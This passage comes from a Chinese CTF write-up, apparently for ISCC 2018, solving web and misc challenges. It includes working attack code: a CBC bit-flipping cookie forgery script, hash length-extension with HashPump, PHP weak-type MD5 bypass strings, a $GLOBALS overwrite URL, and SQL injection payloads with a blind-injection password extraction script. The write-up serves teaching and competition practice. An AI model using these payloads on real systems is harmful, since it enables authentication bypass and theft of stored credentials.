+</code></pre><p><strong>刷新登陆后的页面，将cookie中的cipher改为修改后的cipher</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/KKD543a6Hf.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IKkhEdf592.png?imageslim" alt="mark"><br><strong>将返回<code>base64_decode(&#39;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&#39;) can&#39;t unserialize</code>的错误，因为如果修改第一组密文中的某个字节，初始化向量不变也会导致第一组明文解密时发生改变，从而导致解密出的序列化的格式发生改变而导致反序列化失败，所以还要根据这串返回的base64重新生成新的iv，让解密出的第一个分组的明文还原成原先的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2c03bBEIIF.png?imageslim" alt="mark"></p>
+<pre><code>import urllib
+import base64
+iv=&quot;pO%2FPPYF9sNQq9oGENmDdFA%3D%3D&quot;
+iv=base64.b64decode(urllib.unquote(iv))
+jiamingwen = base64.b64decode(urllib.unquote(&apos;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&apos;))
+mingwen = &apos;a:2:{s:8:&quot;userna&apos;
+newiv = &apos;&apos;
+for i in range(0,16):
+    newiv += chr(ord(mingwen[i])^ord(jiamingwen[i])^ord(iv[i])) 
+print urllib.quote(base64.b64encode(newiv))
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/1KemB4cciD.png?imageslim" alt="mark"><br><strong>同样的，解释一下这段代码</strong></p>
+<pre><code>有个前提
+如果c=a^b
+那么a=c^b，b=a^c    
+
+因为：
+iv^解密（假密文）=假明文
+iv^解密（假密文）^假明文=0(假明文^假明文=0)
+所以：
+iv^解密（假密文）^假明文^明文=明文（0^明文=明文）
+又因为需要达到：
+newiv^解密（假密文）=明文
+所以：
+newiv=iv^假明文^明文    
+</code></pre><p><strong>所以新的iv变为</strong></p>
+<pre><code>dR9UMoe8drNhp9pRsl3%2Bxw%3D%3D
+</code></pre><p><strong>然后将cookie中的cipher和iv同时改为新生成的即可，这样的话解密后只会将第二组明文的<code>A</code>变为<code>a</code>，而且第一分组解密出的明文并不会发生改变，序列化格式也自然不会改变，这样就可以反序列化成功，然后将<code>$_SESSION[&#39;username&#39;]</code>重新赋值为解密出的<code>admin</code>明文,然后绕过验证输出flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/CKJ6Dcd12A.png?imageslim" alt="mark"></p>
+<pre><code>flag：ISCC{123dasd89as10aas}
+</code></pre><h2 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h2><p><strong>HINT：那么长的秘钥，要爆破到什么时候啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/L8D33j2aBJ.png?imageslim" alt="mark"><br><strong>又是一到代码审计题</strong></p>
+<pre><code>&lt;?php
+include &quot;secret.php&quot;;
+@$username=(string)$_POST[&apos;username&apos;];
+function enc($text){
+    global $key;
+    return md5($key.$text);
+}
+if(enc($username) === $_COOKIE[&apos;verify&apos;]){
+    if(is_numeric(strpos($username, &quot;admin&quot;))){
+        die($flag);
+    }
+    else{
+        die(&quot;you are not admin&quot;);
+    }
+}
+else{
+    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);
+    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);
+}
+show_source(__FILE__);
+</code></pre><p><strong>可以看出这道题是考察hash长度扩展攻击的，对于这种攻击方式原理自己还没有完全搞懂，于是就把做题方法记录一下</strong></p>
+<p><strong>首先，需要在linux中安装一个名为HashPump的工具，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。下面是安装方法</strong></p>
+<pre><code>git clone https://github.com/bwall/HashPump
+apt-get install g++ libssl-dev
+cd HashPump
+make
+make install
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/djl8cGgHb7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/h9K28hGb3B.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/EK41J2h9cF.png?imageslim" alt="mark"></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2a476FI9DG.png?imageslim" alt="mark"><br><strong>之后POST提交username为guest，运行hashpump，将burp抓包抓到的cookie中的verify与len输入，然后输入数据和要追加的数据（guest与admin）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/4f00bhjilb.png?imageslim" alt="mark"><br><strong>之后便会生成新的数据与hash值，分别将username与cookie中的verify改为hashpump新生成的值即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IIa4EJkA21.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E5EjHdh6h3.png?imageslim" alt="mark"></p>
+<pre><code>flag：ISCC{MD5_1s_n0t_5afe}
+</code></pre><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/4C6ld3If9m.png?imageslim" alt="mark"><br><strong>打开后可以看到代码如下</strong></p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt;
+    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;
+    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt;
+    &lt;input type=&quot;submit&quot; &gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+header(&quot;content-type:text/html;charset=utf-8&quot;);
+if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;])){
+    $username = $_POST[&apos;username&apos;];
+    $password = $_POST[&apos;password&apos;];
+}
+else{
+    $username=&quot;hello&quot;;
+    $password=&quot;hello&quot;;
+}
+if(md5($password) == 0){
+    echo &quot;xxxxx&quot;;
+}
+
+
+show_source(__FILE__);
+?&gt;
+</code></pre><p><strong>这里考察php的弱类型，可以利用开头为0e的MD5值绕过，以下列举了一些MD5后开头为0e的字符串</strong></p>
+<pre><code>QNKCDZO
+0e830400451993494058024219903391
+
+s878926199a
+0e545993274517709034328855841020
+
+s155964671a
+0e342768416822451524974117254469
+
+s214587387a
+0e848240448830537924465865611904
+
+s214587387a
+0e848240448830537924465865611904
+
+s878926199a
+0e545993274517709034328855841020
+
+s1091221200a
+0e940624217856561557816327384675
+
+s1885207154a
+0e509367213418206700842008763514
+
+s1502113478a
+0e861580163291561247404381396064
+
+s1885207154a
+0e509367213418206700842008763514
+
+s1836677006a
+0e481036490867661113260034900752
+
+s155964671a
+0e342768416822451524974117254469
+
+s1184209335a
+0e072485820392773389523109082030
+
+s1665632922a
+0e731198061491163073197128363787
+
+s1502113478a
+0e861580163291561247404381396064
+
+s1836677006a
+0e481036490867661113260034900752
+
+s1091221200a
+0e940624217856561557816327384675
+
+s155964671a
+0e342768416822451524974117254469
+
+s1502113478a
+0e861580163291561247404381396064
+
+s155964671a
+0e342768416822451524974117254469
+
+s1665632922a
+0e731198061491163073197128363787
+
+s155964671a
+0e342768416822451524974117254469
+
+s1091221200a
+0e940624217856561557816327384675
+
+s1836677006a
+0e481036490867661113260034900752
+
+s1885207154a
+0e509367213418206700842008763514
+
+s532378020a
+0e220463095855511507588041205815
+
+s878926199a
+0e545993274517709034328855841020
+
+s1091221200a
+0e940624217856561557816327384675
+
+s214587387a
+0e848240448830537924465865611904
+
+s1502113478a
+0e861580163291561247404381396064
+
+s1091221200a
+0e940624217856561557816327384675
+
+s1665632922a
+0e731198061491163073197128363787
+
+s1885207154a
+0e509367213418206700842008763514
+
+s1836677006a
+0e481036490867661113260034900752
+
+s1665632922a
+0e731198061491163073197128363787
+
+s878926199a
+0e545993274517709034328855841020
+</code></pre><p><strong>输入用户名和以上其中一个字符串作为密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/JCfL3mdhGc.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/m8Ab2Ia83m.png?imageslim" alt="mark"><br><strong>进入第二关，代码如下</strong></p>
+<pre><code>NULL &lt;?php
+include &apos;flag.php&apos;;
+$a = @$_REQUEST[&apos;a&apos;];
+@eval(&quot;var_dump($$a);&quot;);
+show_source(__FILE__);
+
+?&gt; 
+</code></pre><p><strong>可以看出存在变量覆盖漏洞，利用全局变量’$GLOBALS’覆盖</strong></p>
+<pre><code>http://118.190.152.202:8005/no_md5.php?a=GLOBALS
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2ID3G0Jjck.png?imageslim" alt="mark"></p>
+<pre><code>flag:ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4}
+</code></pre><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p><strong>题目直接说明这是一道注入，打开后是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BKJ21D2858.png?imageslim" alt="mark"><br><strong>测试一下是否存在注入</strong></p>
+<p><strong>输入</strong></p>
+<pre><code>username=&apos; or 1=1 and 1=1#
+password=123456
+</code></pre><p><strong>会直接登陆成功并将我们输入的username:<code>&#39; or 1=1 and 1=1#</code>输出出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/lbHB1lK397.png?imageslim" alt="mark"><br><strong>输入</strong></p>
+<pre><code>username=&apos; or 1=2 and 1=1#
+password=123456
+</code></pre><p><strong>则会显示输入的用户名或密码错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9h4A03j9b8.png?imageslim" alt="mark"><br><strong>由此可以判断<code>username</code>参数可能存在注入。大概的登陆验证过程：将输入的username与password拼接成sql查询语句带入数据库查询，如果查到结果便会登陆成功并显示输入的用户名，查询不到结果就会返回用户名或密码错误的提示</strong></p>
+<p><strong>可以看出该处是一个很普通的盲注，可以写脚本也可以直接用sqlmap，这里为了尽快拿到一血直接上sqlmap</strong></p>
+<pre><code>sqlmap.py -r &quot;C:\Users\I&apos;m possible\Desktop\post.txt&quot; -p username --dump -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; -T &quot;news&quot; -D &quot;sqli_database&quot;
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G4J8lce8IE.png?imageslim" alt="mark"></p>
+<pre><code>flag{hahaha999999999}
+</code></pre><h2 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h2><p><strong>HINT：我都过滤了，看你怎么绕。记住是mysql</strong></p>
+<p><strong>打开后看到是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5b9D0GfAGf.png?imageslim" alt="mark"><br><strong>结合题目提示猜测是去绕WAF注入，首先测试了一下，发现当用户名正确而密码错误时会返回<code>password error</code>，当用户名错误时会返回<code>username error的错误</code>，于是猜测可能存在盲注。</strong></p>
+<p><strong>测试了一下，发现大概过滤了以下关键字</strong></p>
+<pre><code>#、,、union、--+、and、or、|、%26（&amp;的url编码）
+</code></pre><p><strong>简单来说，就是不能使用and，or等关键字进行逻辑判断去盲注，同样不能使用注释符去注释后面的语句。谷歌了一下<a href="https://www.anquanke.com/post/id/85936" title="相关的资料" target="_blank" rel="external">相关的资料</a>，发现这种情况可以利用mysql的<a href="http://www.freebuf.com/articles/web/8773.html" title="隐式类型转换" target="_blank" rel="external">隐式类型转换</a>去绕过，类似于php的弱类型。所谓的隐式类型转换，简单来说，就是对mysql的字符类型进行一些加、减、取余等数字操作运算时，又或者是将字符类型与数字类型进行比较时，会将字符类型转为数字类型，比如</strong></p>
+<pre><code>mysql&gt; select &apos;45abcd&apos;-&apos;abc&apos;;
++----------------+
+| &apos;45abcd&apos;-&apos;abc&apos; |
++----------------+
+|             45 |
++----------------+
+1 row in set, 2 warnings (0.02 sec)
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/66FADIfl31.png?imageslim" alt="mark"><br><strong>在这里将字符串<code>45abcd</code>转为了数字<code>45</code>,将字符串<code>abc</code>转为了数字<code>0</code></strong><br><strong>于是可以得出不是以数字开头的字符串在进行隐式类型转换时都会转为数字0</strong><br><strong>再看</strong></p>
+<pre><code>mysql&gt; select &apos;aaa&apos;=0;
++---------+
+| &apos;aaa&apos;=0 |
++---------+
+|       1 |
++---------+
+1 row in set, 1 warning (0.00 sec)
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/59e6GD26C4.png?imageslim" alt="mark"><br><strong>在这里将字符串aaa与数字0进行比较时将字符串aaa转为了数字0</strong></p>
+<p><strong>再看以下语句</strong></p>
+<pre><code>mysql&gt; select * from users where username=0;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+13 rows in set (0.00 sec)    
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/77f80m2hGC.png?imageslim" alt="mark"><br><strong>可以看到<code>where username=0</code>时会将数据表中所有数据类型查出来，因为username在数据库中的存储类型为varchar类型，也就是字符串类型，在进行比较时会将这些字符串类型全转为数字类型，所以不以数字开头的字符串都会被转成0，从而查询出所有结果</strong></p>
+<p><strong>再看</strong></p>
+<pre><code>mysql&gt; select * from users where username=&apos;&apos;-0-&apos;&apos;;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+13 rows in set (0.00 sec)    
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i6k7I0cFFe.png?imageslim" alt="mark"><br><strong>可以看出当<code>where username=&#39;&#39;-0-&#39;&#39;</code>时会进行隐式类型转换，运算结果相当于<code>where username=0</code>,会返回所有结果</strong></p>
+<p><strong>如果将中间的0变为1，相当于<code>where username=-1</code>,由于数据库里没有以-1开头的字符串，就会返回空</strong></p>
+<pre><code>mysql&gt; select * from users where username=&apos;&apos;-1-&apos;&apos;;
+Empty set (0.00 sec)    
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LhKhC37728.png?imageslim" alt="mark"><br><strong>由此可以看出我们是可以在中间这个位置进行逻辑判断去盲注的</strong></p>
+<p><strong>知道了这些后来返回题目看这道题，构造payload</strong></p>
+<pre><code>uname=&apos;-0-&apos;&amp;passwd=123456
+</code></pre><p><strong>这里用户名有查询结果，所以会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E7FLDcFlBk.png?imageslim" alt="mark"><br><strong>构造payload</strong></p>
+<pre><code>uname=&apos;-1-&apos;&amp;passwd=123456
+</code></pre><p><strong>而这里用户名没有查询结果，所以会返回<code>username error</code>的错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5Adfbcg230.png?imageslim" alt="mark"><br><strong>按照这个思路，可以进行逻辑判断进行盲注，构造payload猜出数据库中passwd字段的长度</strong></p>
+<pre><code>uname=&apos;-(length(passwd)=passwd的长度)-&apos;&amp;passwd=123456
+</code></pre><p><strong>当<code>(length(passwd)=passwd的长度)</code>为真时结果为1，也就是查不出用户名，会返回<code>username error</code>，为假时结果为0，会返回查询结果但是密码错误，也就会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/ebgKLjl969.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6800eBgjbK.png?imageslim" alt="mark"><br><strong>通过这种方式可以判断出用户表中有一个长度为32字节的passwd字段</strong></p>
+<p><strong>同样的可以通过这种方式判断出passwd字段中的值，用python写一个脚本即可，贴出我的代码</strong></p>
+<pre><code>import requests
+url=&quot;http://118.190.152.202:8019/login.php&quot;
+passwd=&quot;&quot;
+for i in range(1,33):
+    for j in range(1,256):
+        data={
+            &apos;uname&apos;:&quot;&apos;-(ascii(mid((passwd)from(%d)))=%d)-&apos;&quot;%(i,j),
+            &apos;passwd&apos;:&apos;admin&apos;
+        }
+        html=requests.post(url,data=data).content
+        if &quot;username error!!&quot; in html:
+            passwd=passwd+chr(j)
+            print passwd
+            break
+</code></pre><p><strong>为了更好的理解脚本，可以看看以下我测试时写的查询语句</strong></p>
+<pre><code>mysql&gt; select mid((password)from(1)) from users;
++------------------------+
+| mid((password)from(1)) |
++------------------------+
+| Dumb                   |
+| I-kill-you             |
+| p@ssword               |
+| crappy                 |
+| stupidity              |
+| genious                |
+| mob!le                 |
+| admin                  |
+| admin1                 |
+| admin2                 |
+| admin3                 |
+| dumbo                  |
+| admin4                 |
++------------------------+
+13 rows in set (0.00 sec)    
+
+mysql&gt; select mid((password)from(2)) from users;
++------------------------+
+| mid((password)from(2)) |
++------------------------+
+| umb                    |
+| -kill-you              |
+| @ssword                |
+| rappy                  |
+| tupidity               |
+| enious                 |
+| ob!le                  |
+| dmin                   |
+| dmin1                  |
+| dmin2                  |
+| dmin3                  |
+| umbo                   |
+| dmin4                  |
++------------------------+
+13 rows in set (0.00 sec)    
+
+mysql&gt; select ascii(mid((password)from(1))) from users;
++-------------------------------+
+| ascii(mid((password)from(1))) |
++-------------------------------+
+|                            68 |
+|                            73 |
+|                           112 |
+|                            99 |
+|                           115 |
+|                           103 |
+|                           109 |
+|                            97 |
+|                            97 |
+|                            97 |
+|                            97 |
+|                           100 |
+|                            97 |
++-------------------------------+
+13 rows in set (0.00 sec)    
+
+mysql&gt; select ascii(mid((password)from(2))) from users;
++-------------------------------+
+| ascii(mid((password)from(2))) |
++-------------------------------+
+|                           117 |
+|                            45 |
+|                            64 |
+|                           114 |
+|                           116 |
+|                           101 |
+|                           111 |
+|                           100 |
+|                           100 |
+|                           100 |
+|                           100 |
+|                           117 |
+|                           100 |
++-------------------------------+
+13 rows in set (0.00 sec)    
+
+mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=117)-&apos;b&apos;;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+11 rows in set, 26 warnings (0.00 sec)    
+
+mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=118)-&apos;b&apos;;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+13 rows in set, 26 warnings (0.00 sec)    
+</code></pre><p><strong>最后跑出密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6F8e68Ha50.png?imageslim" alt="mark"></p>
+<pre><code>0416af0a8accf2be556a8e131438b814
+</code></pre><p><strong>MD5在线解密一下，通过密码可以看出出题人素质并不怎么高</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/hik351lm3b.png?imageslim" alt="mark"></p>
+<pre><code>nishishabi1438
+</code></pre><p><strong>用户名<code>admin</code>，密码<code>nishishabi1438</code>，登陆成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/J8h7d48C81.png?imageslim" alt="mark"><br><strong>后台并没有flag，看提示应该是命名执行，但是试了好多命令都没有回显，最后偶然输入了<code>flag</code>，结果flag就出来了。。。ctm</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/I87lF5ffkG.png?imageslim" alt="mark"></p>
+<pre><code>flag{sql_iNjEct_Is_Easy} 
+</code></pre><h2 id="Misc方向"><a href="#Misc方向" class="headerlink" title="Misc方向"></a>Misc方向</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p><strong>HINT：Where is the FLAG？</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/h28Le5LE80.png?imageslim" alt="mark"><br><strong>下载下来发现是一个图片，图片中一个手指向下指，图片名为WhatIsThat，于是猜测下面有一部分因为高度的问题没有显示出来，查看图片属性中的分辨率</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/FH2K6mE9JG.png?imageslim" alt="mark"><br><strong>将500转为16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j6a0iCgBai.png?imageslim" alt="mark"><br><strong>用winhex16进制编辑工具打开，查找500的16进制，修改图片的高度，看看能不能将图片的下面显示出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/5eJmBcdcd7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/E5HjlBi8fd.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j73lkBK07e.png?imageslim" alt="mark"><br><strong>可以看到flag已经出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/9896a394g8.png?imageslim" alt="mark"><br><code>Flag={_Welcome_To_ISCC_2018_}</code></p>
+<h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p><strong>HINT:知识就是力量</strong></p>
+<pre><code>秘密电报：
+知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA
+</code></pre><p><strong>混过密码吧的我明显看出是培根密码，该密码有两种密码表，第一次选密码表选错了，直接写python解密</strong></p>
+<pre><code>e=(&quot;ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA&quot;).lower()
+d={
+&apos;aaaaa&apos;:&apos;A&apos;,
+&apos;aaaab&apos;:&apos;B&apos;,
+&apos;aaaba&apos;:&apos;C&apos;,
+&apos;aaabb&apos;:&apos;D&apos;,
+&apos;aabaa&apos;:&apos;E&apos;,
+&apos;aabab&apos;:&apos;F&apos;,
+&apos;aabba&apos;:&apos;G&apos;,
+&apos;aabbb&apos;:&apos;H&apos;,
+&apos;abaaa&apos;:&apos;I&apos;,
+&apos;abaab&apos;:&apos;J&apos;,
+&apos;ababa&apos;:&apos;K&apos;,
+&apos;ababb&apos;:&apos;L&apos;,
+&apos;abbaa&apos;:&apos;M&apos;,
+&apos;abbab&apos;:&apos;N&apos;,
+&apos;abbba&apos;:&apos;O&apos;,
+&apos;abbbb&apos;:&apos;P&apos;,
+&apos;baaaa&apos;:&apos;Q&apos;,
+&apos;baaab&apos;:&apos;R&apos;,
+&apos;baaba&apos;:&apos;S&apos;,
+&apos;baabb&apos;:&apos;T&apos;,
+&apos;babaa&apos;:&apos;U&apos;,
+&apos;babab&apos;:&apos;V&apos;,
+&apos;babba&apos;:&apos;W&apos;,
+&apos;babbb&apos;:&apos;X&apos;,
+&apos;bbaaa&apos;:&apos;Y&apos;,
+&apos;bbaab&apos;:&apos;Z&apos;
+}
+for i in range(0,len(e)/5):
+    a=e[5*i:5*i+5]
+    for j in d.keys():
+        if a==j:
+            print d[j]
+            break
+#另一个密码表
+#&apos;AAAAA&apos;:&apos;a&apos;,
+#&apos;AAAAB&apos;:&apos;b&apos;,
+#&apos;AAABA&apos;:&apos;c&apos;,
+#&apos;AAABB&apos;:&apos;d&apos;,
+#&apos;AABAA&apos;:&apos;e&apos;,
+#&apos;AABAB&apos;:&apos;f&apos;,
+#&apos;AABBA&apos;:&apos;g&apos;,
+#&apos;AABBB&apos;:&apos;h&apos;,
+#&apos;ABAAA&apos;:&apos;i&apos;,
+#&apos;ABAAA&apos;:&apos;j&apos;,
+#&apos;ABAAB&apos;:&apos;k&apos;,
+#&apos;ABABA&apos;:&apos;l&apos;,
+#&apos;ABABB&apos;:&apos;m&apos;,
+#&apos;ABBAA&apos;:&apos;n&apos;,
+#&apos;ABBAB&apos;:&apos;o&apos;,
+#&apos;ABBBA&apos;:&apos;p&apos;,
+#&apos;ABBBB&apos;:&apos;q&apos;,
+#&apos;BAAAA&apos;:&apos;r&apos;,
+#&apos;BAAAB&apos;:&apos;s&apos;,
+#&apos;BAABA&apos;:&apos;t&apos;,
+#&apos;BAABB&apos;:&apos;u&apos;,
+#&apos;BAABB&apos;:&apos;v&apos;,
+#&apos;BABAA&apos;:&apos;w&apos;,
+#&apos;BABAB&apos;:&apos;x&apos;,
+#&apos;BABBA&apos;:&apos;y&apos;,
+#&apos;BABBB&apos;:&apos;z&apos;
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/72h93k8km6.png?imageslim" alt="mark"><br><strong>也可以直接在线解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/KeaecDEf7k.png?imageslim" alt="mark"><br><code>flag:ILIKEISCC</code></p>
+<h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p><strong>HINT：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</strong><br><strong>下载下来后是个看似加密过的zip压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gEGGkIb3jm.png?imageslim" alt="mark"><br><strong>但是题目名就是说的暴力破解不可取，于是首先想到的就是zip伪加密，对于zip伪加密，首先要了解zip文件的16进制格式，winhex打开我们下载的压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/k7Jbg0fAgC.png?imageslim" alt="mark"><br><strong>下面来说一下压缩包的16进制文件格式</strong></p>
+<pre><code>一个zip文件由三部分组成，压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志压缩源文件数据区： 
+50 4B 03 04：这是头文件标记（0x04034b50） 
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密） 
+08 00：压缩方式 
+4E A0：最后修改文件时间 
+08 49：最后修改文件日期 
+91 08 EE B9：CRC-32校验（B9EE0891） 
+11 00 00 00：压缩后尺寸（17） 
+0F 00 00 00：未压缩尺寸（15） 
+08 00：文件名长度 
+00 00：扩展记录长度
+压缩源文件目录区： 
+50 4B 01 02：目录中文件文件头标记(0x02014b50) 
+3F 00：压缩使用的 pkware 版本 
+14 00：解压文件所需 pkware 版本 
+07 08：全局方式位标记（有无加密，这个更改这里进行伪加密，第二个加密位如果为奇数，打开就会提示有密码了，在这里第二个加密位为07，所以确实是伪加密） 
+08 00：压缩方式 
+4E A0：最后修改文件时间 
+08 49：最后修改文件日期 
+91 08 EE B9：CRC-32校验（B9EE0891） 
+11 00 00 00：压缩后尺寸（17） 
+0F 00 00 00：未压缩尺寸（15） 
+08 00：文件名长度 
+24 00：扩展字段长度 
+00 00：文件注释长度 
+00 00：磁盘开始号 
+00 00：内部文件属性 
+20 00 00 00：外部文件属性 
+00 00 00 00：局部头部偏移量
+压缩源文件目录结束标志： 
+50 4B 05 06：目录结束标记 
+00 00：当前磁盘编号 
+00 00：目录区开始磁盘编号 
+01 00：本磁盘上纪录总数 
+01 00：目录区中纪录总数 
+5A 00 00 00：目录区尺寸大小 
+37 00 00 00：目录区对第一张磁盘的偏移量 
+00 00：ZIP 文件注释长度
+</code></pre><p><strong>通过介绍可以看出这里的压缩文件确实存在伪加密，由于压缩源文件目录区的全局方式标记位标记的第二个加密位控制着压缩文件是否为伪加密，为奇数时就为伪加密，为偶数时正常，所以我们将这一位改为08保存，再次打开就不会显示加密了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/8ilhjlJ5cj.png?imageslim" alt="mark"><br><strong>可以看到flag文件里的内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/kDheF0j5J6.png?imageslim" alt="mark"><br><strong>但是提交不成功，猜想此处做了加密，想到凯撒加密的套路，写python脚本解密一下吧</strong></p>
+<pre><code>s=&quot;vfppjrnerpbzvat&quot;
+for i in range(0,27):
+    for j in range(0,len(s)):
+        s=s[:j]+chr(97+(ord(s[j:j+1])-97+1)%26)+s[j+1:]
+    print s
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gd6D8Bhd3C.png?imageslim" alt="mark"><br><strong>找到一个规则的字符串，恩恩，就<code>isccwearecoming</code>吧</strong></p>
+<p><code>flag:isccwearecoming</code></p>
